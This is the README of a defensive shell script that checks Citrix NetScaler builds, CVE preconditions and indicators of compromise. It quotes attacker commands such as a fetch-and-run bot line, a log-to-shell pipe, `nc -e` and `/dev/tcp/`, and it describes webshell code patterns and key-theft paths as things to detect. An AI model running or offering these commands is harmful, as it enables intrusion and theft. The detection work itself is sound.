# NetScaler checker for CTX697096 and CTX697174

Read-only precondition and exposure checker for the Citrix NetScaler ADC / NetScaler Gateway security bulletin **[CTX697096](https://support.citrix.com/external/article/CTX697096/citrix-netscaler-adc-and-citrix-netscale.html)**, covering **CVE-2026-88771 through CVE-2026-88778**, and for **[CTX697174](https://support.citrix.com/external/article/CTX697174)**, covering **CVE-2026-88779** (the SAML crash attack).

> ⚠️ **CVE-2026-88771 and CVE-2026-88772 are exploited in the wild** and are listed in the [CISA KEV catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog). Upgrade now, and assume breach on internet-facing appliances.

> 🚨 **CVE-2026-88779 (3 October): the SAML attack now has a fix, and SAML appliances must upgrade again.** The crafted SAML requests that crash patched NetScalers since 2 October are CVE-2026-88779 ([CTX697174](https://support.citrix.com/external/article/CTX697174), CVSS 8.7, targeted attacks; on CISA's Known Exploited Vulnerabilities list since 4 October, US federal deadline 7 October). You are affected if your config has `add authentication samlAction` or `add authentication samlIdPProfile`. Fixed in **14.1-73.41, 13.1-64.28, 14.1-73.41 FIPS and 13.1-37.282 FIPS/NDcPP**, so an appliance already upgraded for CTX697096 must be **upgraded again**. Until then, Citrix offers Global Deny List signatures through NetScaler Console, or a responder policy from Citrix Support. Checker **v1.15** checks your build against these versions, shows whether a SAML mitigation policy covers every Gateway/AAA vserver, and reports injection attempts from 2 October until the CVE-2026-88779 fix as "may have run".

It answers four questions for each NetScaler:

1. **Is this build vulnerable?** It checks the build against the fixed versions and flags end-of-life releases.
2. **Which CVE preconditions does this configuration meet?** The eight CTX697096 preconditions in the default partition and every admin partition, and the SAML precondition of CVE-2026-88779.
3. **What could go wrong during the upgrade?** It flags known upgrade issues from the Citrix guidance.
4. **Was I hacked?** With `--ioc`, it checks every public indicator of compromise for CVE-2026-88771 published so far, and tells you whether attack traffic came before or after your fix.

For background, a timeline and step-by-step remediation, see the accompanying blog post: **[CVE-2026-88771 through CVE-2026-88778 – what you should know and how to fix your NetScaler](https://www.poppelgaard.com/cve-2026-88771-through-cve-2026-88778-what-you-should-know-and-how-to-fix-your-netscaler-adc-netscaler-gateway)**.

It is a single POSIX shell script with no dependencies. It runs on the appliance itself or against an exported `ns.conf` on any Linux, macOS or WSL machine.

---

## Fix check and IoC sweep

Without switches, the script checks **exposure and fix status**. With `--ioc`, it also checks for **compromise**: every public indicator of compromise for CVE-2026-88771 and CVE-2026-88772 published so far, from Mandiant/GTIG, Unit 42, Arctic Wolf, watchTowr, CERT-EU, GreyNoise, Beazley Security, Elastic, PitScaler.com and its sources, and others (see the credits below).

> **Use it together with the official Citrix IoC scan, not instead of it.**
> - The official IoCs are only available through **NetScaler Console** (Security Advisory, then Indicators of Compromise) or from **Citrix Support**. Run that scan first, **before** you upgrade or reboot, because some traces may only exist in memory.
> - This script only knows the indicators that have been published. A clean result means none of those were found in the files and logs that are still on the box. It does **not** prove the appliance was never compromised. Check the log-retention lines to see how far back that goes.
> - On an HA pair, run it on **both** nodes. HA file sync copies webshells to the peer.

### What `--ioc` checks (appliance only)

**Context: how much is a clean result worth?**
- **When the fixed build started running.** Taken from the kernel that `installns` copies to `/flash` (`ns-<build>.gz`) and the first boot after the install (`/var/nsinstall/installns_state_post_reboot`). Every attack line is tagged before or after this time, and the output says where the date comes from. On a vulnerable build it shows when the exposure started, or that a newer build is installed but not running yet. Override with `--fixdate` if needed.
- **Last boot.** It shows whether in-memory traces can still be found, and warns if a vulnerable box rebooted recently.
- **Log retention** for `ns.log`, `notice.log` and `httpaccess-vpn.log`. It warns when less than 7 days are kept, because log-based checks can't see further back.

**Compromise: a command ran on this box** (`[SUSPECT]`)
- PHP webshells anywhere in `/var/netscaler/logon` and `/var/vpn` (any name, any age, e.g. leftovers from the 2023 CVE-2023-3519 wave), one-line webshells that call a request parameter as a function, PHP traces in the Apache error log per file (ran / only blocked), and setuid/setgid programs under `/var`, `/tmp`, `/nsconfig`, `/flash`, `/home`, `/root`.
- Config and SSL-key theft: a web-served file (any extension, e.g. a random `.css` in LogonPoint) holding `ns.conf` content or private keys, and pick-up requests for such a file (HTTP 200 = downloaded).
- For login-injection attempts: the payload download hosts, the likely source IP, and the payload in the shell audit logs (proof that it ran).
- The FreeBSD Sliver implant's file names (`citrix3.bad`, an executable `/var/tmp/.host`).
- The `.ctxs.receiver` webshell by name and SHA-256, any other `*.receiver` file in the web folders (randomly named copies, Huntback.io), and PHP or webshell code (`<?php`, `passthru(`, `NSC_TASS`) anywhere in `LogonPoint/custom` or `/var/vpn`, which catches renamed copies.
- The httpd `Alias`/`AliasMatch` for `receiver.min(.<hex>).css` in `/etc/httpd.conf` or `/nsconfig/httpd.conf`.
- A package (`.deb`) file in the login-page theme folder (`LogonPoint/custom`, `logon/themes`): the SAML-attack kit (SLAPSHOT) keeps a webshell there as `receiver.deb` (Lupovis).
- Files written by exploit payloads: the `nx_verify.html` canary, `/var/tmp/wtw*`, `watchTowr*`, `boom*`, and any small recent file in `/tmp`, `/var/tmp` or the web roots that contains `id` output.
- A setuid `/bin/sh`.
- `httpd.conf` changes that make a **non-`.php` extension run as PHP** (e.g. `.deb`, `.sig`), or `AliasMatch` rules pointing into Gateway folders such as `vpn/media` or `vpn/scripts` ([Mandiant/GTIG](https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances/)).
- PHP or webshell code in the Gateway plugin and media folders (`vpn/scripts/linux`, `vista`, `mac`, `vpn/media`), which should only hold packages and images.
- Tunnel artefacts: `/tmp/.uxdport`, `/tmp/.uxdlock`, a Python process started from base64, or the SLAPSHOT marker `UXD_IDLE_EXIT` in a running process or a file in `/tmp` / `/var/tmp`.
- **WHIPSHOT-style webshell code** (Mandiant): commands read from `HTTP_X_UX*`, or `eval`/`base64_decode` on `HTTP_NSC_CLIENTTYPE` / `HTTP_NSC_LDAP`, in `LogonPoint/custom`, `/var/vpn` and the Gateway plugin and media folders. Known webshell SHA-256 hashes (GreyNoise, IFIN, eSentire, Unit 42 via Deyda) are checked in the same folders. Real client packages such as `nsgclient*.deb` are only flagged by content, never by name.
- `php_flag engine on` or a `SetHandler` for PHP in `httpd.conf` (Beazley, CERT-EU).
- PHP or shell scripts under `/netscaler/ns_gui` written after boot. Webshells differ per appliance, so this does not depend on a name or hash.
- `c88771.json` / `xua.html`, and any archive disguised as a web file (`.html`, `.json`, `.css`, `.js`, `.txt` with gzip, tar or zip content), which is how a stolen `/flash/nsconfig` is staged for download.
- Marker files from exploit tools in `/tmp` and `/var/tmp`, including `/tmp/watchTowr` from the public watchTowr CVE-2026-88772 (DTLS) tool. `/tmp` is emptied at reboot.
- Files dropped by the known payloads: `/.x`, `/s`, `lula`, `/var/1.py`, `update_c*.pl`, `themes/wt88771*` (Gotham Technology Group), `/var/tmp/.s` (Arctic Wolf), `x.sh` in `/`, `/tmp` and `/var/tmp` (PitScaler), the stolen-config archive `vpn/c` in the Gateway web folders (Rapid7) and the privilege helper `/var/netscaler/.ns_suidcmd` (Unit 42).
- Leftovers of the 2020 CVE-2019-19781 backdoor NOTROBIN (`/var/nstmp/.nscache`, `/tmp/.init`, changed portal templates, `[%` in bookmarks), reported as compromise (via Gotham).
- The **`nsmon.pl` Perl implant** ([Arctic Wolf](https://github.com/rtkwlf/wolf-tools/tree/main/pack_alerts/202609-citrix-netscaler-active-exploitation-cve-2026-88771)): its hidden folder `/var/tmp/.nsmon` (`.cfg`, `.state`, `nsmon.pl`), its cron persistence in `/etc/crontab`, `/nsconfig/crontab` or any user crontab (Perl as root every 5 minutes), a running `nsmon.pl` process (NetScaler's own `nsmonitor` and monitor scripts are not flagged), or Perl listening on a TCP port between 41000 and 41999.
- Five payload SHA-256 hashes from Arctic Wolf (`/xd7h/x`, `nsmon.pl`, `update_c08937.pl`, the Platypus agent script), checked in `/tmp`, `/var/tmp`, the top of `/` and `/var`, and the web folders.
- Files payloads write stolen data or loaders into: `logon/insight-new.js`, `admin_ui/e.txt`, `admin_ui/log.txt`. Only path, size and date are shown, never the contents (Gotham, Deyda).
- A setuid shell copy in `/var/tmp/sh`, and persistence in startup files (`rc.netscaler`, `ns.conf`, `/etc/rc`): Python one-liners, `zlib`/`base64` decoders and reversed path strings used in earlier NetScaler campaigns (Deyda).
- Any text or script file in the Gateway client-package folders, not only PHP (Gotham).
- An **EPA default group set to `NO_AUTH`** in the saved config (`ns.conf` and its older saved copies) or by a CLI command in `ns.log` (`CMD_EXECUTED`): what the admin-persistence payload found by [Wiz](https://x.com/AmitaiCo) leaves behind, also after the script itself is deleted. `NO_AUTH` is the attacker's group name, not a NetScaler default.
- An **admin-persistence payload script** (Deyda v9.43): one file in `/var/tmp`, `/tmp`, `/nsconfig` or `/flash/nsconfig` that adds and binds an admin user, sets the EPA default group to `NO_AUTH` (EPA scan effectively off), unbinds authentication or VPN policies and saves the config. Each command alone is normal admin work, so only all five together are flagged.
- Strings inside the [Unit 42](https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/) `.deb` webshell (dropped as `nsg64.deb` or `nsgclient18.deb`): its RC4 key, login token and passphrase, searched by content in the web and Gateway folders, so renamed copies are found too.
- LevelBlue's post-exploitation artefacts ([via The Hacker News](https://thehackernews.com/2026/10/citrix-netscaler-post-exploitation.html)): a backdoor superuser account `sec_monitor` in `ns.conf`, a webshell hidden as `LogonPoint/.local_journal`, and the `/tmp/update_result_*.tgz` archive used to stage a stolen `/flash/nsconfig` (gone after a reboot).
- The **Platypus C2 agent** ([TENEX](https://tenex.ai/blog/what-tenex-observed-inside-active-exploitation-of-netscaler-zero-day/)): its working folder `/var/core/.ns-cache` (`client.crt`/`client.key` mean it enrolled with its C2), copies hidden as `/netscaler.local/ns_*.pl`, a `/var/python/bin/customsnmpd` replaced by the agent (found by hash or by the agent's signing key inside it), and processes with its decoy names (`system-health`, `health-monitor`, `sys-health`, `node-health`, `healthd`). An oversized `customsnmpd` (over 10 MB) is flagged as `[CHECK]`.
- The webshell alias disguised as `LogonUISimple.html.style.min(.<hex>).css` in `httpd.conf`, and the `id009.txt` proof-of-execution file in `/netscaler/ns_gui` (TENEX).
- The **Platypus agent bootstrap script by content** (`Platypus agent bootstrap`, `PLATYPUS_INGRESS_CA`, `AGENT_TOKEN='plt_`) in `/tmp`, `/var/tmp`, `/var`, `/`, `/netscaler.local` and `/var/core`. Every copy has its own enrollment token, so the hash differs per victim.
- **Generic obfuscated webshell code** in all web-served folders: `eval()` around `gzinflate`/`gzuncompress`/`gzdecode`/`str_rot13`/`base64_decode`/`strrev`, `eval`/`assert` on `$_POST`/`$_GET`/`$_REQUEST`/`$_COOKIE`, `preg_replace` with `/e`, `create_function`. This is the same idea as Nextron's generic THOR webshell rules: renamed files and changed hashes are still caught.
- The **kit the SAML attack tries to install** (2 October, sample `72cff13f…` shared by the community): `/nsconfig/.slap/` (Perl agent, bridge and `boot.sh`, which survive a reboot), `/var/tmp/.ux/` (`slapshot.py` on 127.0.0.1:9909, `whipd.py` on port 9910), `/etc/httpd.conf.slap.bak`, `.slap.*` webshells and the webshell token in the web folders, `.slap` lines in `rc.netscaler` or any crontab, its logs in `/var/tmp/.slap-*`, and the running agent or listeners. The alias `receiver.v2.min[.<hex>].css` and the exfiltration host 213.209.159.55 are covered too.
- A file `/v` (also in `/tmp` or `/var/tmp`): written and run by a bot seen on 2 October (`fetch -qo /v http://<host>:443/t/<hex>; sh /v`).
- A payload process running now (`lula`, `update_c`, `nsmon`, `xd7h`, `/.x`), or an open connection to campaign infrastructure (Gotham).
- On a vulnerable build: **ARMED**, injected payload text still waiting in `ns.log`, `ns.log.0` or `messages`, which the vulnerable daily check reads next (Gotham). Since v1.10 this uses the vulnerable script's own pattern, so the command can come before or after the fake `pitboss` words.
- Web files changed in the last 30 days (`--days` to change). Theme rewrites (20 or more files in one burst), files written during the upgrade (including HA sync from the peer) and the standard Citrix `strings.<lang>.js` loaders are recognised as expected. Any other changed file gets a content check for data-sending code, obfuscated loaders and webshell calls.

**Targeted: attack traffic in the logs**
- Injected commands in `ns.log`, `/var/log/messages`, `notice.log` and `nsvpn.log` (where the authentication daemon `nsaaad` logs login names): fake `pitboss` messages as the login name (`...unexpectedly died NSPPE;<cmd>` and `...missed too many heartbeatsNSPPE;<cmd>`), `${IFS}` instead of spaces (also URL-encoded), backticks, `$(`, and commands straight after `;` or `|` (including FreeBSD `fetch`). Following [Elastic](https://github.com/elastic/detection-rules/blob/main/rules/network/initial_access_netscaler_log_poisoning_command_injection.toml)'s detection rule, any `pitboss` packet-engine message with a shell character (`;`, backtick, `$(`, `&&`, `||`, or URL-encoded `%3b` `%60` `%7c` `%24%28` `%26%26` `%3e` `%3c`) is also reported, which catches hand-written variants. This is the CVE-2026-88771 technique described by [watchTowr](https://labs.watchtowr.com/oh-look-the-foot-gun-went-off-again-citrix-netscaler-preauth-command-injection-cve-2026-88771/) and [CERT-EU](https://cert.europa.eu/blog/taking-execute-logging-a-bit-too-literally-cve-2026-88771).
- Base64 commands in the User-Agent, either as `INDEX:<base64>` (CERT-EU two-stage variant) or as the whole User-Agent (Kevin Beaumont), **shown decoded**.
- **Log-reflection** (Lupovis): a plain-text shell script parked in a tagged User-Agent (`<tag>:<script>`), and the injection that later runs it from the log (`grep <tag>: /var/log/htt* | sed … | sh`). When both are found, the report shows which staged requests carry the tag and from which IPs.
- Post-exploitation in the shell history (`/var/log/sh.log*`, `bash.log*`): `ldapsearch`, `openssl s_client` and `ns_gui/vpn`, which attackers use to pull AD credentials through the LDAP bind account (Kevin Beaumont).
- Possible CVE-2026-88772 (DTLS) attempts: DTLSv1.0 handshake failures with "Internal Error", and packet-engine crashes (`exit with orphan rings`, `NOT restarting NSPPE`). When both are present, the output flags it as a likely CVE-2026-88772 attempt (Deyda).
- Attack payloads in requests to the login pages (`/nf/auth/doAuthentication.do`, `/cgi/login`, `/p/u/doLogon.do`, `tmindex.html`, `GetUserName`) as recorded in the HTTP logs: `pitboss`, `NSPPE`, `%3B`, `%60`, `${IFS}`, `curl`, `wget` or `fetch`. These are still visible after `ns.log` has rotated. Normal requests to these pages are not flagged (Deyda).
- 131 known attacker IPs and the domains `echvista.com`, `entretiensol.com`, `white-guard.pro`, `gsocket.io`, `pylrk.cc`, `oast.fun`, `dnsl.cc`, `gs.thc.org`, `webhook.site`, `dnshook.site`, `pinggy.net`, `serveousercontent.com` and five Platypus certificate domains, shown as dated log lines (TENEX, Truesec, eSentire, IFIN, Corelight, Lupovis via PitScaler.com, Gotham Technology Group, Mandiant, Arctic Wolf, Unit 42, Rapid7, Beazley Security, [Huntback](https://huntback.io/blog/cve-88771-analysis), [GreyNoise](https://www.greynoise.io/blog/swarming-against-citrix-0-day-exploitation), [Lupovis](https://x.com/LupovisDefence)), requests to the webshell alias, the `httpworkbench` DNS-exfil domain, the `NX-CVE-OK` canary, the `ns-88771-poc` / `PoCbit` scanner user agents, and payload strings from Arctic Wolf (`xd7h/`, `nsmon`, `update_c08937`, `/dev/tcp/`, `nc -e`, `base64 -w0`, `exec-ok`), the webshell header names `HTTP_X_UX` / `HTTP_NSC_LDAP` / `HTTP_NSC_CLIENTTYPE` and the webshell command cookie `NSC_TASS` in the HTTP logs, and from TENEX `gsocket`, the `platypus-agent` user agent, `/api/v1/agents/enroll`, requests for `LogonUISimple.html.style.min…css` and the `;# NSX<hex>` attempt marker.
- About 60 opportunistic scanner IPs tagged by GreyNoise, in a separate group marked as a hunting lead only (Cloudflare WARP addresses are left out: they are shared by ordinary users).
- Base64 PHP (`PD9…`) in the User-Agent, e.g. on `/vpn/media/*.ico`: webshell staging through the access log (eSentire), **shown decoded**.
- Probes: 1-byte `nsepa.deb` pre-checks (HTTP 206), the `vp_probe_nonexist` recon marker, `scanner-probe` logins, and requests for `.ctxs.receiver`, `.slap.receiver` or any other `*.receiver` file, for `receiver(.v2).min.<hex>.css` (also with the `g` suffix scanners add to bypass a CDN cache), and for `receiver.deb` or a random 12-character `.deb` in `LogonPoint/custom` (Lupovis) in LogonPoint per source IP (Gotham, Huntback.io).
- Requests for `/vpn/c`, the path the stolen-config archive is served from (Rapid7): HTTP 200 is reported as compromise (configuration archive likely downloaded), 404 as a probe. Also web requests to `/nsconmsg` (a CLI tool, never a web path; Corelight), a base64 payload staged in a `K:<base64>#` User-Agent (1 October variant), the `/download/x.sh` payload, the fake `Team-NetScaler-Inventory` user agent, and failed logins from four password-spray sources (all via Gotham).
- Key and config theft in the shell history: `/flash/nsconfig/keys`, `F1.key`/`F2.key`, `database.php`, `LDAPTLS_REQCERT` (Deyda).
- Covering tracks in the shell history: `kill` of NetScaler's `customsnmpd` (LevelBlue).
- **Before or after your fix:** every dated attack line is tagged `[BEFORE fix]` or `[after fix]`. Attempts after the fixed build was installed and before 2 October could not run commands, so they are reported as `[CHECK]`. **Since 2 October a new, unpatched issue can run injected commands on fixed builds** (Citrix SAML guidance; a patched honeypot ran a downloaded binary), so attempts from 2 October on are `[SUSPECT]` ("may have run"). If a file that an injected command tried to write (`>/path`, `-qo /path`, `-o /path`) exists, it is reported as compromise. The decision uses every matching line, and `[BEFORE fix]` lines are always shown first.

**Other community checks**
- `httpd.conf` changes outside a reboot or upgrade, and recent crash dumps (FreeBSD `bounds` and `minfree` files are ignored).
- Crontab entries and processes for user `nobody`, root crontab lines that download something, and crontabs for any other user.
- **Every system user** in `ns.conf` other than `nsroot`, with its command policies and groups, listed as `[CHECK]` so you can confirm each one is yours. Compare with `show system user` on the CLI, because an account that was added but never saved is not in `ns.conf`.
- **Users added since an older saved config:** NetScaler keeps older saved configs (`/nsconfig/ns.conf.0`, `.1` …). A user that is not in an older copy was added after it was saved, and the output shows that date. EPA policies that were bound in the oldest copy and are no longer bound are listed too (`[CHECK]`).
- **User, EPA and policy commands in the CLI audit log** (`ns.log`, `CMD_EXECUTED`): `add`/`bind system user`, `set authentication epaAction`, `unbind … -policy` and `show ns runningConfig -outfile`, with time, user and source IP (`[CHECK]`). `Remote_ip 127.0.0.1` means the command came from a shell on the appliance, which is typical for a payload.
- **Scripts in temp folders that download and run something** (`curl`/`wget`/`fetch` together with `| sh`, `| perl`, `chmod +x` or `nohup`) in `/tmp`, `/var/tmp` and the top of `/var`, as `[CHECK]` (a generic downloader pattern, like Nextron's `SUSP_Linux_Downloader` rule).
- **The SAML crash attack, CVE-2026-88779 (CTX697174).** Crafted SAML requests make the authentication daemon `nsaaad` crash, also on builds with the CTX697096 fixes; after repeated crashes the appliance restarts, and then the HA peer. Affected when `ns.conf` has `add authentication samlAction` (SAML SP) or `add authentication samlIdPProfile` (SAML IdP); fixed in 14.1-73.41 / 13.1-64.28 / 14.1-73.41 FIPS / 13.1-37.282 FIPS/NDcPP. The checker always prints one line: `[OK]` when neither is configured or the build is fixed, `[CHECK]` when SAML is configured on a build without the fix, with whether a SAML mitigation policy is bound `-type AAA_REQUEST` on every Gateway/AAA vserver (recognised by its rule, also through a named policy expression; only names are shown), which vservers are not covered, `-type REQUEST` bindings that never see sign-in traffic, and whether the Responder feature is on. Citrix's Global Deny List signatures are not visible in `ns.conf`, so the output gives the command to check them. `nsaaad` core files and crash lines are listed ("exited on signal", "proc nsaaad … EXITED", "monitored processes have exited", "Pitboss declaring system failure"), with crashes after the CVE-2026-88779 fix counted separately.
- **Failed management/NITRO logins from public addresses** in `ns.log`, with a count per address (`[CHECK]`). CVE-2026-88771 is staged through a failed login to the unauthenticated NITRO API, so this means the management interface is reachable from the internet.
- **Cron jobs that delete or empty logs or files** (trace wiping, Beazley Security) are reported as compromise.
- `/nsconfig/nsafter.sh` (runs after every boot): Python, decoders, downloads, `nc`, setuid changes or writes into web folders are reported as compromise; any change in the last 30 days as `[CHECK]`.
- Hidden files in all web-served folders, and `.dot` files under `LogonPoint/custom`.
- Files changed in the last 30 days (`--days` to change) at the top of `/` and `/var` and in `/tmp` and `/var/tmp` (NetScaler's own files and anything written at boot or upgrade are filtered out).
- Processes running download tools or one-liners, connections from the management plane to public addresses, and packet engines that restarted after boot (possible CVE-2026-88772, visible even when the logs have rotated).
- `HeadlessChrome` in the VPN access logs.
- `b64decode` strings in the HTTP logs, and `.php`, `.sh`, `.pl`, `.rpm` or `.tgz` references in the `httperror` logs (notices from the management GUI are ignored).
- PHP or XHTML files under `/var/netscaler` outside the management GUI (`admin_ui`) and `websocketd`, with the files that contain webshell-like code (`eval`, `system`, `passthru`, `base64_decode`) listed separately (Deyda).
- **Copies of `ns.conf`, `.F1.key` or `.F2.key`** in web folders, `/tmp` or `/var/tmp`, and the config exports `/var/tmp/c1.txt`, `c2.txt`, `labels.txt`: a stolen configuration or keys waiting to be downloaded. Only path, size and date are shown (Deyda).
- Successful VPN requests from non-Receiver/Workspace clients, **summarised**: paths other than the standard Gateway pages, the top source IPs, and a NAT warning when 95% or more come from one IP.

Several of these checks are adapted from Manuel Winkel's [NetScaler CVE checklist](https://www.deyda.net/index.php/en/2026/08/28/netscaler-cve-checklist-updates-security-assessment-and-incident-response/) and triage script ([v9.17, v9.28 and v9.43](https://github.com/Deyda/Security/blob/main/deyda-netscaler-ioc-check.sh), Deyda Consulting). Additional indicators come from Gotham Technology Group's IoC check, shared with permission, and from the [PitScaler.com](https://pitscaler.com) IoC collection (30 September snapshot) with its original sources, [Arctic Wolf's alert pack](https://github.com/rtkwlf/wolf-tools/tree/main/pack_alerts/202609-citrix-netscaler-active-exploitation-cve-2026-88771), [Unit 42](https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/), LevelBlue, [TENEX](https://tenex.ai/blog/what-tenex-observed-inside-active-exploitation-of-netscaler-zero-day/), [Beazley Security](https://labs.beazley.security/advisories/BSL-A1216), [watchTowr](https://github.com/watchtowrlabs/watchTowr-vs-Citrix-Netscaler-CVE-2026-88772), Mandiant/GTIG, CERT-EU, GreyNoise, and [Elastic's detection rule](https://github.com/elastic/detection-rules/blob/main/rules/network/initial_access_netscaler_log_poisoning_command_injection.toml). Attacker IPs and webshell names differ per victim (Kevin Beaumont), so a clean result is never proof of a clean box. Thanks to all of them, and to Michael Shuster (Ferroque Systems) for his review and feedback on v1.7!

Log lines that contain binary or terminal-control bytes (common in `ns.log`, and attackers can inject escape codes) are shown with those bytes as `.` and labelled "(line contains binary data)", so a matched line is never blank.

With `--out`, attacker text in the saved report is **defanged** (`;` `|` `&` `` ` `` `$` `<` `>` become `_`, `http:` becomes `hxxp:`) so it is safe to paste into email or chat. The screen shows the raw text.

---

## What it checks

### Build

| Release | Fixed in | Note |
|---|---|---|
| 14.1 | 14.1-73.37 and later | |
| 13.1 | 13.1-64.24 and later | The bulletin lists 64.23. 64.24 is the released build and avoids the 64.23 cyclic-reboot issue with NS variables |
| 14.1-FIPS | 14.1-73.37 FIPS and later | |
| 13.1-FIPS / NDcPP | 13.1-37.279 and later | |
| 13.0, 12.1 and older | No fix (end of life) | Flagged as vulnerable. Upgrade to 14.1 |

The August 2026 builds, 14.1-73.32 and 13.1-63.21, are **not** fixed.

**CVE-2026-88779 (CTX697174, SAML), only when SAML is configured:**

| Release | Fixed in |
|---|---|
| 14.1 | 14.1-73.41 and later |
| 13.1 | 13.1-64.28 and later |
| 14.1-FIPS | 14.1-73.41 FIPS and later |
| 13.1-FIPS / NDcPP | 13.1-37.282 and later |

These builds also contain the CTX697096 fixes, so install them directly.

### CVE preconditions (per partition)

| CVE | CVSS v4 | Issue | Precondition checked |
|---|---|---|---|
| CVE-2026-88771 | 9.5 | Unauthenticated RCE (**exploited**) | All deployments, no workaround |
| CVE-2026-88772 | 9.5 | Memory overflow leading to RCE (**exploited**) | DTLS enabled: VPN vservers without `-dtls OFF`, or DTLS vservers |
| CVE-2026-88773 | 9.3 | HTTP request smuggling | HTTP/SSL LB, CS, VPN or AAA vservers |
| CVE-2026-88774 | 7.0 | Policy bypass (URL normalisation) | `HTTP.REQ.URL` policy expressions |
| CVE-2026-88775 | 8.8 | Memory overflow / DoS | Gateway or AAA vservers |
| CVE-2026-88776 | 8.8 | Memory overflow / DoS | LB vservers of type ORACLE |
| CVE-2026-88777 | 8.8 | Memory overflow / DoS | FTP LB/CS/service/monitor, LSN FTP ALG (on unless disabled), RTSP ALG, DNS64, NAT64 |
| CVE-2026-88778 | 8.8 | TCP ISN prediction | TCP-based vservers with **Enhanced ISN Generation** not enabled. This needs a config change, not just the upgrade |
| CVE-2026-88779 | 8.7 | Memory overflow / DoS (SAML, **targeted attacks**; CTX697174) | `add authentication samlAction` (SAML SP) or `add authentication samlIdPProfile` (SAML IdP). Default partition only |

### Upgrade risks

- **NS variables on 13.1.** 13.1-64.23 may go into a cyclic reboot during the upgrade when NS variables are configured, so upgrade straight to 13.1-64.24.
- **SAML.** `samlRejectUnsignedAssertion OFF` is no longer supported and is forced ON by the upgrade. If your IdP does not sign assertions, SAML logons will break.

### Admin partitions

When partition configs exist (`/nsconfig/partitions/*/ns.conf`, or `partitions/*/ns.conf` next to an exported `ns.conf`), each partition gets its own precondition report.

According to the NetScaler documentation, TCP parameters are partition-specific. **Enable Enhanced ISN Generation in the default partition and in every admin partition.**

---

## Usage

### On the appliance

```sh
# copy the script (use binary mode in WinSCP, see Troubleshooting)
scp ctx697096_check.sh nsroot@<NSIP>:/var/tmp/

ssh nsroot@<NSIP>
> shell
cd /var/tmp
sh ctx697096_check.sh --summary  # am I fixed? was I hacked? short result on screen, full report in /var/tmp
sh ctx697096_check.sh            # the same, full report on screen
sh ctx697096_check.sh --no-ioc   # build + preconditions + partitions + upgrade risks only (no compromise check)
```

Since **v1.15** the compromise check (all public IoCs) runs **by default** on the appliance. Before, it needed `--ioc`, and a run without it ended with "fixed build" although the box had never been checked for compromise. `--ioc` is still accepted, so existing scripts and Console jobs keep working.

Save the output for your change record:

```sh
sh ctx697096_check.sh --ioc --out /var/tmp/ctx697096_$(hostname)_$(date +%Y%m%d).txt
```

Notes:

- The script reads the **saved** config (`/nsconfig/ns.conf`). Run `save ns config` first if there are unsaved changes.
- On HA pairs, run it on **both** nodes, especially with `--ioc`.
- It needs shell access (nsroot, or a superuser account).

### All commands at a glance

```sh
sh ctx697096_check.sh                                   # full check on the appliance: build, preconditions, compromise check
sh ctx697096_check.sh --summary                         # short result on screen, full report saved in /var/tmp
sh ctx697096_check.sh --no-ioc                          # build, preconditions, partitions and upgrade risks only
sh ctx697096_check.sh --ioc                             # same as the default on the appliance (kept for older scripts and Console jobs)
sh ctx697096_check.sh --out /var/tmp/report.txt         # also save the report as plain text (also: --out=/var/tmp/report.txt)
sh ctx697096_check.sh --summary --out /var/tmp/r.txt    # short result on screen, full report in the file you choose
sh ctx697096_check.sh --days 60                         # look 60 days back for changed files (default 30)
sh ctx697096_check.sh --fixdate "2026-09-27 16:32"      # set when the fixed build started running, if the detected date is wrong
sh ctx697096_check.sh --no-banner                       # no start banner
sh ctx697096_check.sh --hide-ip                         # NSIP shown as "hidden" (for screenshots and reports you share)
sh ctx697096_check.sh /path/to/ns.conf                  # offline: check an exported config (no compromise check)
sh ctx697096_check.sh --partition /path/to/ns.conf      # check a single admin partition config
sh ctx697096_check.sh --version                         # show the version
sh ctx697096_check.sh --help                            # show the help
echo $?                                                 # exit code of the last run (see Exit codes)
```

Options can be combined, e.g. `sh ctx697096_check.sh --summary --days 60 --no-banner`.

### From NetScaler Console (configuration job)

To check many appliances at once, run the checker as a **configuration job** in NetScaler Console (service or on-premises). Console copies the script to every selected appliance and runs it there. Each appliance saves its own full report in `/var/tmp`.

> **Console may not show the script's output.** In some (perhaps all) Console versions, the job only shows that the `shell` command **ran**, not what it printed (thanks to the community member who tested this). So collect the results from the appliances, as in step 4. I'm working on a way to get the result line into Console itself; feedback from your tenant is welcome.

1. **Infrastructure > Configuration > Configuration Jobs > Create Job**, instance type NetScaler, select the instances.
2. Add the commands (source: *File* or type them in):
   ```
   put ctx697096_check.sh /var/tmp/ctx697096_check.sh
   shell sh /var/tmp/ctx697096_check.sh --ioc --summary
   ```
   With `put`, you choose the local `ctx697096_check.sh`; Console stores it and copies it to every selected instance.
3. Run the job. If your Console shows the command output (**Details > Execution Summary**), the first line is the result:
   ```
   CTX697096 checker 1.15: host=ns01 nsip=10.0.0.10 build=14.1-73.37 status=FIXED isn=ENABLED compromise=no targeted=yes,after_fix_only saml=sp cve88779=vulnerable verdict=VULNERABLE_CVE-2026-88779 runtime=23s
   ```
   `status` is the CTX697096 status of the build. `saml` is `sp`, `idp`, `sp+idp` or `none`. `cve88779` is `vulnerable`, `fixed`, `n/a` (no SAML) or `unknown`. `verdict` is one of `OK`, `FOLLOW_UP`, `ISN_OPEN`, `TARGETED_BEFORE_FIX`, `TARGETED_SINCE_2OCT`, `VULNERABLE`, `VULNERABLE_CVE-2026-88779`, `COMPROMISED` or `UNKNOWN`.
4. **Collect the results.** The full report is on each appliance in `/var/tmp/ctx697096_<host>_<date>_<time>.txt`. Copy the reports to a management host with SCP or WinSCP, e.g. `scp nsroot@ns01:/var/tmp/ctx697096_*.txt .`, then list the result of every appliance at once. The result line is the last line of each report:
   ```
   grep -h "^CTX697096 checker" ctx697096_*.txt
   ```
   Read the full report of every appliance whose `verdict` isn't `OK`.

Notes:
- Console must log on to the instances with a **superuser** account (e.g. `nsroot`): the `shell` command needs shell access.
- The script is read-only. The only thing it writes is the report file in `/var/tmp`, plus the copy of the script itself.
- On an HA pair, select **both** nodes.
- Not tested on every Console version: if your tenant needs different quoting for `shell`, use `shell "sh /var/tmp/ctx697096_check.sh --ioc --summary"`. Feedback welcome.

### Many appliances: community tools

Two community tools copy a checker to many NetScalers, run it and bring the reports back:

